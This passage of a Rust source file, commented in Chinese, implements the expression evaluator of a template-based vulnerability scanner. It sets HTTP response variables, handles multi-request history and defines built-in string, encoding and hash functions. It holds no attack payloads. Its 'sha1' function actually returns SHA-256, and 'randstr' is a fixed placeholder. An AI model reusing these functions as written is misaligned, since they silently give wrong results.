        evaluator.context.set_variable("status_code".to_string(), DslValue::Integer(status.as_u16() as i64));
        evaluator.context.set_variable("body".to_string(), DslValue::String(body.to_string()));
        evaluator.context.set_variable("content_length".to_string(), DslValue::Integer(body.len() as i64));
        evaluator.context.set_variable("url".to_string(), DslValue::String(url.to_string()));
        evaluator.context.set_variable("headers".to_string(), DslValue::String(headers_string.clone()));
        // 添加header变量（单数形式，某些模板使用这个）
        evaluator.context.set_variable("header".to_string(), DslValue::String(headers_string.clone()));

        // 设置带数字后缀的变量（用于多请求模板）
        evaluator.context.set_variable("status_code_1".to_string(), DslValue::Integer(status.as_u16() as i64));
        evaluator.context.set_variable("body_1".to_string(), DslValue::String(body.to_string()));
        evaluator.context.set_variable("content_length_1".to_string(), DslValue::Integer(body.len() as i64));
        evaluator.context.set_variable("headers_1".to_string(), DslValue::String(headers_string.clone()));
        // 添加header_1变量（单数形式，某些模板使用这个）
        evaluator.context.set_variable("header_1".to_string(), DslValue::String(headers_string.clone()));

        // 添加响应时间变量（关键修复）
        evaluator.context.set_variable("duration".to_string(), DslValue::Float(duration_ms));
        evaluator.context.set_variable("duration_1".to_string(), DslValue::Float(duration_ms));
        evaluator.context.set_variable("all_headers".to_string(), DslValue::String(headers_string.clone()));

        // 添加随机字符串变量（如果模板中定义了）
        evaluator.context.set_variable("randstr".to_string(), DslValue::String("random_string_placeholder".to_string()));

        // 设置单个响应头变量
        for (key, value) in headers {
            let header_name = key.as_str().to_lowercase().replace('-', "_");
            evaluator.context.set_variable(
                header_name,
                DslValue::String(value.to_str().unwrap_or("").to_string())
            );
        }

        evaluator
    }

    /// 设置变量值
    pub fn set_variable(&mut self, name: String, value: DslValue) {
        self.context.set_variable(name, value);
    }

    /// 评估DSL表达式字符串
    pub fn evaluate_expression(&self, expression: &str) -> Result<DslValue> {
        let compiled = CompiledExpression::compile(expression)?;
        compiled.evaluate(self)
    }

    /// 求值AST节点
    pub fn evaluate(&self, node: &AstNode) -> Result<DslValue> {
        match node {
            AstNode::Literal(value) => Ok(value.clone()),
            AstNode::Variable(name) => {
                self.context.get_variable(name)
                    .ok_or_else(|| anyhow!("未定义的变量: {}", name))
            }
            AstNode::PropertyAccess { object, property } => {
                let object_value = self.evaluate(object)?;
                self.evaluate_property_access(&object_value, property)
            }
            AstNode::IndexAccess { object, index } => {
                let object_value = self.evaluate(object)?;
                let index_value = self.evaluate(index)?;
                self.evaluate_index_access(&object_value, &index_value)
            }
            AstNode::FunctionCall { name, args } => {
                let arg_values: Result<Vec<DslValue>> = args.iter()
                    .map(|arg| self.evaluate(arg))
                    .collect();
                let arg_values = arg_values?;
                self.context.call_function(name, &arg_values)
            }
            AstNode::BinaryOp { left, operator, right } => {
                let left_val = self.evaluate(left)?;
                let right_val = self.evaluate(right)?;
                self.evaluate_binary_op(&left_val, operator, &right_val)
            }
            AstNode::UnaryOp { operator, operand } => {
                let operand_val = self.evaluate(operand)?;
                self.evaluate_unary_op(operator, &operand_val)
            }
        }
    }

    /// 求值二元操作
    fn evaluate_binary_op(
        &self,
        left: &DslValue,
        operator: &BinaryOperator,
        right: &DslValue,
    ) -> Result<DslValue> {
        match operator {
            BinaryOperator::And => Ok(DslValue::Boolean(left.to_bool() && right.to_bool())),
            BinaryOperator::Or => Ok(DslValue::Boolean(left.to_bool() || right.to_bool())),
            BinaryOperator::Equal => Ok(DslValue::Boolean(self.values_equal(left, right))),
            BinaryOperator::NotEqual => Ok(DslValue::Boolean(!self.values_equal(left, right))),
            BinaryOperator::LessThan => self.compare_values(left, right, |a, b| a < b),
            BinaryOperator::LessEqual => self.compare_values(left, right, |a, b| a <= b),
            BinaryOperator::GreaterThan => self.compare_values(left, right, |a, b| a > b),
            BinaryOperator::GreaterEqual => self.compare_values(left, right, |a, b| a >= b),
            BinaryOperator::Add => self.arithmetic_op(left, right, |a, b| a + b, |a, b| a + b),
            BinaryOperator::Subtract => self.arithmetic_op(left, right, |a, b| a - b, |a, b| a - b),
            BinaryOperator::Multiply => self.arithmetic_op(left, right, |a, b| a * b, |a, b| a * b),
            BinaryOperator::Divide => self.arithmetic_op(left, right, |a, b| a / b, |a, b| a / b),
        }
    }

    /// 求值一元操作
    fn evaluate_unary_op(&self, operator: &UnaryOperator, operand: &DslValue) -> Result<DslValue> {
        match operator {
            UnaryOperator::Not => Ok(DslValue::Boolean(!operand.to_bool())),
            UnaryOperator::Minus => match operand {
                DslValue::Integer(i) => Ok(DslValue::Integer(-i)),
                DslValue::Float(f) => Ok(DslValue::Float(-f)),
                _ => Err(anyhow!("无法对 {:?} 应用负号操作", operand)),
            },
        }
    }

    /// 比较两个值是否相等
    fn values_equal(&self, left: &DslValue, right: &DslValue) -> bool {
        match (left, right) {
            (DslValue::String(a), DslValue::String(b)) => a == b,
            (DslValue::Integer(a), DslValue::Integer(b)) => a == b,
            (DslValue::Boolean(a), DslValue::Boolean(b)) => a == b,
            (DslValue::Float(a), DslValue::Float(b)) => (a - b).abs() < f64::EPSILON,
            (DslValue::Integer(a), DslValue::Float(b)) => (*a as f64 - b).abs() < f64::EPSILON,
            (DslValue::Float(a), DslValue::Integer(b)) => (a - *b as f64).abs() < f64::EPSILON,
            _ => false,
        }
    }

    /// 比较两个值的大小
    fn compare_values<F>(&self, left: &DslValue, right: &DslValue, op: F) -> Result<DslValue>
    where
        F: Fn(f64, f64) -> bool,
    {
        let left_num = match left {
            DslValue::Integer(i) => *i as f64,
            DslValue::Float(f) => *f,
            _ => return Err(anyhow!("无法比较非数值类型")),
        };

        let right_num = match right {
            DslValue::Integer(i) => *i as f64,
            DslValue::Float(f) => *f,
            _ => return Err(anyhow!("无法比较非数值类型")),
        };

        Ok(DslValue::Boolean(op(left_num, right_num)))
    }

    /// 执行算术操作
    fn arithmetic_op<F1, F2>(
        &self,
        left: &DslValue,
        right: &DslValue,
        int_op: F1,
        float_op: F2,
    ) -> Result<DslValue>
    where
        F1: Fn(i64, i64) -> i64,
        F2: Fn(f64, f64) -> f64,
    {
        match (left, right) {
            (DslValue::Integer(a), DslValue::Integer(b)) => Ok(DslValue::Integer(int_op(*a, *b))),
            (DslValue::Float(a), DslValue::Float(b)) => Ok(DslValue::Float(float_op(*a, *b))),
            (DslValue::Integer(a), DslValue::Float(b)) => Ok(DslValue::Float(float_op(*a as f64, *b))),
            (DslValue::Float(a), DslValue::Integer(b)) => Ok(DslValue::Float(float_op(*a, *b as f64))),
            _ => Err(anyhow!("无法对非数值类型执行算术操作")),
        }
    }

    /// 求值属性访问
    fn evaluate_property_access(&self, object: &DslValue, property: &str) -> Result<DslValue> {
        match object {
            DslValue::String(obj_name) => {
                // 特殊处理 response 对象
                if obj_name == "__response_object__" {
                    if let Some(response) = &self.context.response {
                        match property {
                            "status_code" => Ok(DslValue::Integer(response.status_code)),
                            "body" => Ok(DslValue::String(response.body.clone())),
                            "headers" => Ok(DslValue::String(response.headers.clone())),
                            "content_length" => Ok(DslValue::Integer(response.content_length)),
                            "response_time" => Ok(DslValue::Integer(response.response_time)),
                            _ => Err(anyhow!("未知的响应属性: {}", property)),
                        }
                    } else {
                        Err(anyhow!("响应上下文不可用"))
                    }
                } else {
                    // 处理其他复合变量名
                    let full_path = format!("{}.{}", obj_name, property);
                    self.context.get_variable(&full_path)
                        .ok_or_else(|| anyhow!("未定义的属性: {}", full_path))
                }
            }
            _ => Err(anyhow!("无法访问属性 '{}': 对象类型不支持", property))
        }
    }

    /// 求值索引访问
    fn evaluate_index_access(&self, object: &DslValue, index: &DslValue) -> Result<DslValue> {
        match object {
            DslValue::String(obj_str) => {
                let index_str = index.to_string();

                // 特殊处理 headers 对象的索引访问
                // 检查是否是headers字符串（包含HTTP headers的完整文本）
                if obj_str.contains(":") && (obj_str.contains("content-type") || obj_str.contains("server") || obj_str.len() > 50) {
                    // 这看起来像是headers字符串，进行header查找
                    let target_key = index_str.trim_matches('"').trim_matches('\'').to_lowercase();

                    for line in obj_str.lines() {
                        if let Some((key, value)) = line.split_once(':') {
                            let key = key.trim().to_lowercase();
                            if key == target_key {
                                return Ok(DslValue::String(value.trim().to_string()));
                            }
                        }
                    }
                    // 如果没找到，返回空字符串
                    Ok(DslValue::String(String::new()))
                } else {
                    // 普通字符串索引访问
                    match index {
                        DslValue::Integer(idx) => {
                            // 数字索引：字符串字符访问
                            let chars: Vec<char> = obj_str.chars().collect();
                            let idx = *idx as usize;
                            if idx < chars.len() {
                                Ok(DslValue::String(chars[idx].to_string()))
                            } else {
                                Err(anyhow!("索引超出范围: {} >= {}", idx, chars.len()))
                            }
                        }
                        DslValue::String(_) => {
                            // 字符串索引：尝试作为headers查找
                            if let Some(response) = &self.context.response {
                                let target_key = index_str.trim_matches('"').trim_matches('\'').to_lowercase();

                                for line in response.headers.lines() {
                                    if let Some((key, value)) = line.split_once(':') {
                                        let key = key.trim().to_lowercase();
                                        if key == target_key {
                                            return Ok(DslValue::String(value.trim().to_string()));
                                        }
                                    }
                                }
                                // 如果没找到，返回空字符串
                                Ok(DslValue::String(String::new()))
                            } else {
                                Err(anyhow!("无法进行字符串索引访问: 响应上下文不可用"))
                            }
                        }
                        _ => Err(anyhow!("无效的索引类型: {:?}", index)),
                    }
                }
            }
            _ => Err(anyhow!("无法对类型 {:?} 进行索引访问", object)),
        }
    }
}

/// 公共API函数：解析并求值DSL表达式（使用缓存）
pub fn evaluate_dsl_expression(
    expression: &str,
    status: &StatusCode,
    headers: &HeaderMap,
    body: &str,
    url: &str,
) -> Result<bool> {
    // 使用表达式缓存
    let compiled = ExpressionCache::get_or_compile(expression)?;
    let evaluator = DslEvaluator::from_http_response(status, headers, body, url);
    let result = compiled.evaluate(&evaluator)?;

    Ok(result.to_bool())
}

/// 公共API函数：带工作流上下文的DSL表达式求值
pub fn evaluate_dsl_expression_with_workflow(
    expression: &str,
    status: &StatusCode,
    headers: &HeaderMap,
    body: &str,
    url: &str,
    workflow_context: Option<Arc<WorkflowContext>>,
) -> Result<bool> {
    let compiled = ExpressionCache::get_or_compile(expression)?;
    let mut evaluator = DslEvaluator::from_http_response(status, headers, body, url);

    if let Some(workflow) = workflow_context {
        evaluator.context.set_workflow_context(workflow);
    }

    let result = compiled.evaluate(&evaluator)?;
    Ok(result.to_bool())
}

/// 多请求历史数据结构
#[derive(Debug, Clone)]
pub struct MultiRequestHistory {
    /// 历史响应数据
    pub responses: Vec<RequestResponseData>,
    /// 当前请求索引
    pub current_index: usize,
}

/// 单个请求响应数据
#[derive(Debug, Clone)]
pub struct RequestResponseData {
    /// 状态码
    pub status_code: i64,
    /// 响应体
    pub body: String,
    /// 响应头
    pub headers: String,
    /// 内容长度
    pub content_length: i64,
    /// 响应时间（毫秒）
    pub duration: f64,
    /// 请求URL
    pub url: String,
    /// 请求时间戳
    pub timestamp: std::time::SystemTime,
}

impl MultiRequestHistory {
    /// 创建新的多请求历史记录
    pub fn new() -> Self {
        MultiRequestHistory {
            responses: Vec::new(),
            current_index: 0,
        }
    }

    /// 添加新的响应数据
    pub fn add_response(&mut self, data: RequestResponseData) {
        self.responses.push(data);
        self.current_index = self.responses.len();
    }

    /// 获取指定索引的响应数据
    pub fn get_response(&self, index: usize) -> Option<&RequestResponseData> {
        if index > 0 && index <= self.responses.len() {
            self.responses.get(index - 1) // 索引从1开始
        } else {
            None
        }
    }

    /// 检查是否有足够的历史数据
    pub fn has_sufficient_data(&self, required_requests: usize) -> bool {
        self.responses.len() >= required_requests
    }
}

/// 检测DSL表达式是否需要多请求支持
pub fn detect_multi_request_requirement(expression: &str) -> usize {
    use regex::Regex;

    // 创建正则表达式来匹配带数字后缀的变量
    let re = Regex::new(r"\b(?:status_code|body|headers|content_length|duration)_(\d+)\b").unwrap();

    let mut max_request_number = 1;

    for cap in re.captures_iter(expression) {
        if let Some(number_match) = cap.get(1) {
            if let Ok(number) = number_match.as_str().parse::<usize>() {
                max_request_number = max_request_number.max(number);
            }
        }
    }

    max_request_number
}

/// 创建支持多请求的DSL评估器
pub fn create_multi_request_evaluator(
    history: &MultiRequestHistory,
    target_url: &str,
) -> DslEvaluator {
    let mut evaluator = DslEvaluator::new();

    // 为每个历史响应设置带编号的变量
    for (i, response_data) in history.responses.iter().enumerate() {
        let index = i + 1; // 从1开始编号

        // 设置状态码变量
        evaluator.set_variable(
            format!("status_code_{}", index),
            DslValue::Integer(response_data.status_code)
        );

        // 设置响应体变量
        evaluator.set_variable(
            format!("body_{}", index),
            DslValue::String(response_data.body.clone())
        );

        // 设置内容长度变量
        evaluator.set_variable(
            format!("content_length_{}", index),
            DslValue::Integer(response_data.content_length)
        );

        // 设置响应头变量
        evaluator.set_variable(
            format!("headers_{}", index),
            DslValue::String(response_data.headers.clone())
        );

        // 设置header变量（单数形式，某些模板使用这个）
        evaluator.set_variable(
            format!("header_{}", index),
            DslValue::String(response_data.headers.clone())
        );

        // 设置响应时间变量（关键修复）
        evaluator.set_variable(
            format!("duration_{}", index),
            DslValue::Float(response_data.duration)
        );

        // 设置URL变量
        evaluator.set_variable(
            format!("url_{}", index),
            DslValue::String(response_data.url.clone())
        );
    }

    // 设置基础变量（如果有第一个响应）
    if let Some(first_response) = history.responses.first() {
        evaluator.set_variable(
            "status_code".to_string(),
            DslValue::Integer(first_response.status_code)
        );
        evaluator.set_variable(
            "body".to_string(),
            DslValue::String(first_response.body.clone())
        );
        evaluator.set_variable(
            "content_length".to_string(),
            DslValue::Integer(first_response.content_length)
        );
        evaluator.set_variable(
            "headers".to_string(),
            DslValue::String(first_response.headers.clone())
        );
        // 添加header变量（单数形式，某些模板使用这个）
        evaluator.set_variable(
            "header".to_string(),
            DslValue::String(first_response.headers.clone())
        );
        evaluator.set_variable(
            "duration".to_string(),
            DslValue::Float(first_response.duration)
        );
        evaluator.set_variable(
            "url".to_string(),
            DslValue::String(target_url.to_string())
        );
    }

    evaluator
}

/// 公共API函数：支持多请求的DSL表达式求值
pub fn evaluate_dsl_expression_with_history(
    expression: &str,
    history: &MultiRequestHistory,
    target_url: &str,
) -> Result<bool> {
    // 检测表达式需要的请求数量
    let required_requests = detect_multi_request_requirement(expression);

    // 检查是否有足够的历史数据
    if !history.has_sufficient_data(required_requests) {
        return Err(anyhow!(
            "DSL表达式需要 {} 个请求的数据，但只有 {} 个可用",
            required_requests,
            history.responses.len()
        ));
    }

    // 创建多请求评估器
    let evaluator = create_multi_request_evaluator(history, target_url);

    // 编译并求值表达式
    let compiled = ExpressionCache::get_or_compile(expression)?;
    let result = compiled.evaluate(&evaluator)?;

    Ok(result.to_bool())
}

/// 公共API函数：批量求值DSL表达式
pub fn evaluate_dsl_expressions_batch(
    expressions: &[String],
    status: &StatusCode,
    headers: &HeaderMap,
    body: &str,
    url: &str,
    workflow_context: Option<Arc<WorkflowContext>>,
) -> Result<Vec<bool>> {
    let evaluator = DslEvaluator::from_http_response(status, headers, body, url);
    let mut results = Vec::new();

    for expression in expressions {
        let compiled = ExpressionCache::get_or_compile(expression)?;
        let mut eval_context = evaluator.clone();

        if let Some(ref workflow) = workflow_context {
            eval_context.context.set_workflow_context(workflow.clone());
        }

        let result = compiled.evaluate(&eval_context)?;
        results.push(result.to_bool());
    }

    Ok(results)
}

/// 清理表达式缓存
pub fn cleanup_expression_cache() {
    ExpressionCache::cleanup_expired(std::time::Duration::from_secs(3600)); // 1小时过期
}

/// 获取缓存统计信息
pub fn get_cache_stats() -> (usize, usize) {
    ExpressionCache::stats()
}

// ==================== 内置函数实现 ====================

/// len函数：返回字符串长度
fn builtin_len(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 1 {
        return Err(anyhow!("len函数需要1个参数"));
    }

    let length = args[0].to_string().len() as i64;
    Ok(DslValue::Integer(length))
}

/// contains函数：检查字符串是否包含子串
fn builtin_contains(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 2 {
        return Err(anyhow!("contains函数需要2个参数"));
    }

    let haystack = args[0].to_string();
    let needle = args[1].to_string();

    Ok(DslValue::Boolean(haystack.contains(&needle)))
}

/// contains_all函数：检查字符串是否包含所有子串
fn builtin_contains_all(args: &[DslValue]) -> Result<DslValue> {
    if args.len() < 2 {
        return Err(anyhow!("contains_all函数至少需要2个参数"));
    }

    let haystack = args[0].to_string();

    for i in 1..args.len() {
        let needle = args[i].to_string();
        if !haystack.contains(&needle) {
            return Ok(DslValue::Boolean(false));
        }
    }

    Ok(DslValue::Boolean(true))
}

/// contains_any函数：检查字符串是否包含任意子串
fn builtin_contains_any(args: &[DslValue]) -> Result<DslValue> {
    if args.len() < 2 {
        return Err(anyhow!("contains_any函数至少需要2个参数"));
    }

    let haystack = args[0].to_string();

    for i in 1..args.len() {
        let needle = args[i].to_string();
        if haystack.contains(&needle) {
            return Ok(DslValue::Boolean(true));
        }
    }

    Ok(DslValue::Boolean(false))
}

/// regex函数：正则表达式匹配
fn builtin_regex(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 2 {
        return Err(anyhow!("regex函数需要2个参数"));
    }

    let text = args[0].to_string();
    let pattern = args[1].to_string();

    match Regex::new(&pattern) {
        Ok(re) => Ok(DslValue::Boolean(re.is_match(&text))),
        Err(e) => Err(anyhow!("正则表达式错误: {}", e)),
    }
}

/// toupper函数：转换为大写
fn builtin_toupper(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 1 {
        return Err(anyhow!("toupper函数需要1个参数"));
    }

    let text = args[0].to_string().to_uppercase();
    Ok(DslValue::String(text))
}

/// tolower函数：转换为小写
fn builtin_tolower(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 1 {
        return Err(anyhow!("tolower函数需要1个参数"));
    }

    let text = args[0].to_string().to_lowercase();
    Ok(DslValue::String(text))
}

/// md5函数：计算MD5哈希
fn builtin_md5(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 1 {
        return Err(anyhow!("md5函数需要1个参数"));
    }

    let text = args[0].to_string();
    let result = md5::compute(text.as_bytes());

    Ok(DslValue::String(format!("{:x}", result)))
}

/// sha1函数：计算SHA1哈希 (使用SHA256代替，因为SHA1已被弃用)
fn builtin_sha1(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 1 {
        return Err(anyhow!("sha1函数需要1个参数"));
    }

    let text = args[0].to_string();
    let mut hasher = Sha256::new();
    hasher.update(text.as_bytes());
    let result = hasher.finalize();

    Ok(DslValue::String(format!("{:x}", result)))
}

/// sha256函数：计算SHA256哈希
fn builtin_sha256(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 1 {
        return Err(anyhow!("sha256函数需要1个参数"));
    }

    let text = args[0].to_string();
    let mut hasher = Sha256::new();
    hasher.update(text.as_bytes());
    let result = hasher.finalize();

    Ok(DslValue::String(format!("{:x}", result)))
}

/// base64函数：Base64编码
fn builtin_base64(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 1 {
        return Err(anyhow!("base64函数需要1个参数"));
    }

    let text = args[0].to_string();
    let encoded = general_purpose::STANDARD.encode(text.as_bytes());

    Ok(DslValue::String(encoded))
}

/// base64_decode函数：Base64解码
fn builtin_base64_decode(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 1 {
        return Err(anyhow!("base64_decode函数需要1个参数"));
    }

    let encoded = args[0].to_string();
    match general_purpose::STANDARD.decode(encoded.as_bytes()) {
        Ok(decoded) => match String::from_utf8(decoded) {
            Ok(text) => Ok(DslValue::String(text)),
            Err(_) => Err(anyhow!("Base64解码结果不是有效的UTF-8字符串")),
        },
        Err(e) => Err(anyhow!("Base64解码错误: {}", e)),
    }
}

// ==================== 新增的nuclei标准函数 ====================

/// starts_with函数：检查字符串是否以指定前缀开始
fn builtin_starts_with(args: &[DslValue]) -> Result<DslValue> {
    if args.len() < 2 {
        return Err(anyhow!("starts_with函数至少需要2个参数"));
    }

    let text = args[0].to_string();

    for i in 1..args.len() {
        let prefix = args[i].to_string();
        if text.starts_with(&prefix) {
            return Ok(DslValue::Boolean(true));
        }
    }

    Ok(DslValue::Boolean(false))
}

/// ends_with函数：检查字符串是否以指定后缀结束
fn builtin_ends_with(args: &[DslValue]) -> Result<DslValue> {
    if args.len() < 2 {
        return Err(anyhow!("ends_with函数至少需要2个参数"));
    }

    let text = args[0].to_string();

    for i in 1..args.len() {
        let suffix = args[i].to_string();
        if text.ends_with(&suffix) {
            return Ok(DslValue::Boolean(true));
        }
    }

    Ok(DslValue::Boolean(false))
}

/// line_starts_with函数：检查字符串的任意行是否以指定前缀开始
fn builtin_line_starts_with(args: &[DslValue]) -> Result<DslValue> {
    if args.len() < 2 {
        return Err(anyhow!("line_starts_with函数至少需要2个参数"));
    }

    let text = args[0].to_string();
    let lines: Vec<&str> = text.lines().collect();

    for i in 1..args.len() {
        let prefix = args[i].to_string();
        for line in &lines {
            if line.starts_with(&prefix) {
                return Ok(DslValue::Boolean(true));
            }
        }
    }

    Ok(DslValue::Boolean(false))
}

/// line_ends_with函数：检查字符串的任意行是否以指定后缀结束
fn builtin_line_ends_with(args: &[DslValue]) -> Result<DslValue> {
    if args.len() < 2 {
        return Err(anyhow!("line_ends_with函数至少需要2个参数"));
    }

    let text = args[0].to_string();
    let lines: Vec<&str> = text.lines().collect();

    for i in 1..args.len() {
        let suffix = args[i].to_string();
        for line in &lines {
            if line.ends_with(&suffix) {
                return Ok(DslValue::Boolean(true));
            }
        }
    }

    Ok(DslValue::Boolean(false))
}

/// to_upper函数：转换为大写（标准nuclei函数名）
fn builtin_to_upper(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 1 {
        return Err(anyhow!("to_upper函数需要1个参数"));
    }

    let text = args[0].to_string().to_uppercase();
    Ok(DslValue::String(text))
}

/// to_lower函数：转换为小写（标准nuclei函数名）
fn builtin_to_lower(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 1 {
        return Err(anyhow!("to_lower函数需要1个参数"));
    }

    let text = args[0].to_string().to_lowercase();
    Ok(DslValue::String(text))
}

/// trim函数：移除字符串两端的指定字符
fn builtin_trim(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 2 {
        return Err(anyhow!("trim函数需要2个参数"));
    }

    let text = args[0].to_string();
    let cutset = args[1].to_string();

    let result = text.trim_matches(|c: char| cutset.contains(c));
    Ok(DslValue::String(result.to_string()))
}

/// trim_left函数：移除字符串左端的指定字符
fn builtin_trim_left(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 2 {
        return Err(anyhow!("trim_left函数需要2个参数"));
    }

    let text = args[0].to_string();
    let cutset = args[1].to_string();

    let result = text.trim_start_matches(|c: char| cutset.contains(c));
    Ok(DslValue::String(result.to_string()))
}

/// trim_right函数：移除字符串右端的指定字符
fn builtin_trim_right(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 2 {
        return Err(anyhow!("trim_right函数需要2个参数"));
    }

    let text = args[0].to_string();
    let cutset = args[1].to_string();

    let result = text.trim_end_matches(|c: char| cutset.contains(c));
    Ok(DslValue::String(result.to_string()))
}

/// trim_space函数：移除字符串两端的空白字符
fn builtin_trim_space(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 1 {
        return Err(anyhow!("trim_space函数需要1个参数"));
    }

    let text = args[0].to_string();
    Ok(DslValue::String(text.trim().to_string()))
}

/// trim_prefix函数：移除字符串的指定前缀
fn builtin_trim_prefix(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 2 {
        return Err(anyhow!("trim_prefix函数需要2个参数"));
    }

    let text = args[0].to_string();
    let prefix = args[1].to_string();

    let result = if text.starts_with(&prefix) {
        &text[prefix.len()..]
    } else {
        &text
    };

    Ok(DslValue::String(result.to_string()))
}

/// trim_suffix函数：移除字符串的指定后缀
fn builtin_trim_suffix(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 2 {
        return Err(anyhow!("trim_suffix函数需要2个参数"));
    }

    let text = args[0].to_string();
    let suffix = args[1].to_string();

    let result = if text.ends_with(&suffix) {
        &text[..text.len() - suffix.len()]
    } else {
        &text
    };

    Ok(DslValue::String(result.to_string()))
}

/// reverse函数：反转字符串
fn builtin_reverse(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 1 {
        return Err(anyhow!("reverse函数需要1个参数"));
    }

    let text = args[0].to_string();
    let reversed: String = text.chars().rev().collect();
    Ok(DslValue::String(reversed))
}

/// repeat函数：重复字符串指定次数
fn builtin_repeat(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 2 {
        return Err(anyhow!("repeat函数需要2个参数"));
    }

    let text = args[0].to_string();
    let count = args[1].to_integer()? as usize;

    Ok(DslValue::String(text.repeat(count)))
}

/// replace函数：替换字符串中的子串
fn builtin_replace(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 3 {
        return Err(anyhow!("replace函数需要3个参数"));
    }

    let text = args[0].to_string();
    let old = args[1].to_string();
    let new = args[2].to_string();

    Ok(DslValue::String(text.replace(&old, &new)))
}

/// replace_regex函数：使用正则表达式替换字符串
fn builtin_replace_regex(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 3 {
        return Err(anyhow!("replace_regex函数需要3个参数"));
    }

    let text = args[0].to_string();
    let pattern = args[1].to_string();
    let replacement = args[2].to_string();

    match Regex::new(&pattern) {
        Ok(re) => Ok(DslValue::String(re.replace_all(&text, replacement.as_str()).to_string())),
        Err(e) => Err(anyhow!("正则表达式错误: {}", e)),
    }
}

/// remove_bad_chars函数：移除指定的字符
fn builtin_remove_bad_chars(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 2 {
        return Err(anyhow!("remove_bad_chars函数需要2个参数"));
    }

    let text = args[0].to_string();
    let cutset = args[1].to_string();

    let result: String = text.chars().filter(|c| !cutset.contains(*c)).collect();
    Ok(DslValue::String(result))
}

/// concat函数：连接多个参数为字符串
fn builtin_concat(args: &[DslValue]) -> Result<DslValue> {
    if args.is_empty() {
        return Ok(DslValue::String(String::new()));
    }

    let result = args.iter()
        .map(|arg| arg.to_string())
        .collect::<Vec<String>>()
        .join("");

    Ok(DslValue::String(result))
}

/// join函数：使用分隔符连接多个元素
fn builtin_join(args: &[DslValue]) -> Result<DslValue> {
    if args.len() < 2 {
        return Err(anyhow!("join函数至少需要2个参数"));
    }

    let separator = args[0].to_string();
    let elements: Vec<String> = args[1..].iter()
        .map(|arg| arg.to_string())
        .collect();

    Ok(DslValue::String(elements.join(&separator)))
}

/// hex_encode函数：十六进制编码
fn builtin_hex_encode(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 1 {
        return Err(anyhow!("hex_encode函数需要1个参数"));
    }

    let text = args[0].to_string();
    Ok(DslValue::String(hex::encode(text.as_bytes())))
}

/// hex_decode函数：十六进制解码
fn builtin_hex_decode(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 1 {
        return Err(anyhow!("hex_decode函数需要1个参数"));
    }

    let encoded = args[0].to_string();
    match hex::decode(&encoded) {
        Ok(decoded) => match String::from_utf8(decoded) {
            Ok(text) => Ok(DslValue::String(text)),
            Err(_) => Err(anyhow!("十六进制解码结果不是有效的UTF-8字符串")),
        },
        Err(e) => Err(anyhow!("十六进制解码错误: {}", e)),
    }
}

/// url_encode函数：URL编码
fn builtin_url_encode(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 1 {
        return Err(anyhow!("url_encode函数需要1个参数"));
    }

    let text = args[0].to_string();
    let encoded: String = form_urlencoded::byte_serialize(text.as_bytes()).collect();
    Ok(DslValue::String(encoded))
}

/// url_decode函数：URL解码
fn builtin_url_decode(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 1 {
        return Err(anyhow!("url_decode函数需要1个参数"));
    }

    let encoded = args[0].to_string();
    match form_urlencoded::parse(encoded.as_bytes()).next() {
        Some((decoded, _)) => Ok(DslValue::String(decoded.to_string())),
        None => {
            // 尝试使用标准URL解码
            match urlencoding::decode(&encoded) {
                Ok(decoded) => Ok(DslValue::String(decoded.to_string())),
                Err(e) => Err(anyhow!("URL解码错误: {}", e)),
            }
        }
    }
}

/// html_escape函数：HTML转义
fn builtin_html_escape(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 1 {
        return Err(anyhow!("html_escape函数需要1个参数"));
    }

    let text = args[0].to_string();
    Ok(DslValue::String(encode_text(&text).to_string()))
}

/// html_unescape函数：HTML反转义
fn builtin_html_unescape(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 1 {
        return Err(anyhow!("html_unescape函数需要1个参数"));
    }

    let text = args[0].to_string();
    Ok(DslValue::String(decode_html_entities(&text).to_string()))
}

/// base64_py函数：Python风格的Base64编码（带换行符）
fn builtin_base64_py(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 1 {
        return Err(anyhow!("base64_py函数需要1个参数"));
    }

    let text = args[0].to_string();
    let encoded = general_purpose::STANDARD.encode(text.as_bytes());
    Ok(DslValue::String(format!("{}\n", encoded)))
}

/// mmh3函数：MurmurHash3哈希
fn builtin_mmh3(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 1 {
        return Err(anyhow!("mmh3函数需要1个参数"));
    }

    let text = args[0].to_string();
    let hash = murmur3::murmur3_32(&mut text.as_bytes(), 0).unwrap_or(0);
    Ok(DslValue::String(hash.to_string()))
}

/// hmac函数：HMAC哈希
fn builtin_hmac(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 3 {
        return Err(anyhow!("hmac函数需要3个参数：algorithm, data, secret"));
    }

    let algorithm = args[0].to_string().to_lowercase();
    let data = args[1].to_string();
    let secret = args[2].to_string();

    match algorithm.as_str() {
        "sha1" => {
            let mut mac = <Hmac<Sha1> as Mac>::new_from_slice(secret.as_bytes())
                .map_err(|e| anyhow!("HMAC密钥错误: {}", e))?;
            mac.update(data.as_bytes());
            let result = mac.finalize();
            Ok(DslValue::String(hex::encode(result.into_bytes())))
        }
        "sha256" => {
